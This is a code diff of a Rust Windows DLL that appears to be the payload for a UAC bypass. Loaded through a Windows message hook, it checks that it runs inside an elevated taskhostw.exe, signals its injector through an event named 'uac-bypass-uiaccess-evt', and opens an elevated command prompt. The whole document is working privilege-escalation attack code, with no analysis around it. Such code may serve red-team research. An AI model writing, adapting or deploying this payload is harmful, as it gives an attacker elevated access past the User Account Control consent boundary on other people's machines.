@@ -1,15 +1,28 @@
 #![no_std]
 
+//! A very simple Windows module that just pops a command prompt shell.
+//!
+//! Since the Rust standard library is not required, this module is marked as `no_std`
+
+use core::ffi::CStr;
+
 use windows::{
     Win32::{
-        Foundation::{CloseHandle, HMODULE, LPARAM, LRESULT, WPARAM},
+        Foundation::{CloseHandle, HANDLE, HMODULE, LPARAM, LRESULT, MAX_PATH, WPARAM},
+        Security::{GetTokenInformation, TOKEN_ALL_ACCESS, TokenElevation},
         System::{
-            LibraryLoader::{GetModuleHandleA, GetProcAddress},
-            Threading::{CREATE_NEW_CONSOLE, CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA},
+            LibraryLoader::{GetModuleFileNameA, GetModuleHandleA, GetProcAddress},
+            Threading::{
+                CREATE_NEW_CONSOLE, CreateProcessA, GetCurrentProcess, OpenEventA,
+                OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOA, SetEvent, TIMER_MODIFY_STATE,
+            },
         },
-        UI::WindowsAndMessaging::{CallNextHookEx, MSG, UnhookWindowsHookEx},
+        UI::{
+            Shell::PathFindFileNameA,
+            WindowsAndMessaging::{CallNextHookEx, MSG, UnhookWindowsHookEx},
+        },
     },
-    core::{PCSTR, PSTR},
+    core::{PCSTR, PSTR, s},
 };
 
 const DLL_PROCESS_ATTACH: u32 = 1;
@@ -34,6 +47,36 @@ pub extern "system" fn DllMain(_module: HMODULE, reason: u32, _reserved: *mut u8
                 return true;
             }
         }
+    }
+
+    // Check if we are running in the correct process and notify injector
+    unsafe {
+        let mut path = [0; MAX_PATH as _];
+        let length = GetModuleFileNameA(None, &mut path);
+        if length == 0 {
+            return false;
+        }
+
+        let filename = PathFindFileNameA(PCSTR(path.as_ptr()));
+        let filename_c = CStr::from_ptr(filename.as_ptr() as _);
+
+        let is_taskhost = filename_c
+            .to_string_lossy()
+            .eq_ignore_ascii_case("taskhostw.exe");
+        let is_elevated = is_elevated().unwrap_or(false);
+
+        // Not the target process
+        if !is_taskhost || !is_elevated {
+            return false;
+        }
+
+        // Notify the injector to unhook
+        let Ok(event) = OpenEventA(TIMER_MODIFY_STATE, false, s!("uac-bypass-uiaccess-evt")) else {
+            return false;
+        };
+
+        _ = SetEvent(event);
+        _ = CloseHandle(event);
     }
 
     // Pop a shell
@@ -65,14 +108,27 @@ pub extern "system" fn DllMain(_module: HMODULE, reason: u32, _reserved: *mut u8
     false
 }
 
+/// `WH_GETMESSAGE` hook procedure
 #[unsafe(no_mangle)]
 pub extern "system" fn windows_hook_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
-    let message = unsafe { &*(lparam.0 as *const MSG) };
-    if message.message == 0x511 {
-        unsafe {
-            _ = UnhookWindowsHookEx(core::mem::transmute(message.lParam));
-        }
-    }
-
     unsafe { CallNextHookEx(None, code, wparam, lparam) }
+}
+
+fn is_elevated() -> windows::core::Result<bool> {
+    unsafe {
+        let mut token = HANDLE::default();
+        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut token)?;
+
+        let mut length = 0;
+        let mut elevated = 0u32;
+        GetTokenInformation(
+            token,
+            TokenElevation,
+            Some(&mut elevated as *mut _ as *mut _),
+            4,
+            &mut length,
+        )?;
+
+        Ok(elevated != 0)
+    }
 }
